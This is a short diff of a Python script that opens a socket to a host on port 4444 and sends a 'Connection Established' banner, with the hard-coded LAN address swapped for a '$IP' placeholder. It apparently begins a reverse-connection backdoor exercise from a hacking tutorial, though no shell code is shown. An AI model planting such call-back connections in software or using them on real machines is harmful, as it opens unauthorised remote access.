@@ -3,7 +3,7 @@ import socket
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connecting to the destination and we have used two brackets as it accepts values in the form of tuples
-connection.connect(("192.168.43.198", 4444))
+connection.connect(("$IP", 4444))
 
 # send data
 message = "[+]Connection Established.\n"
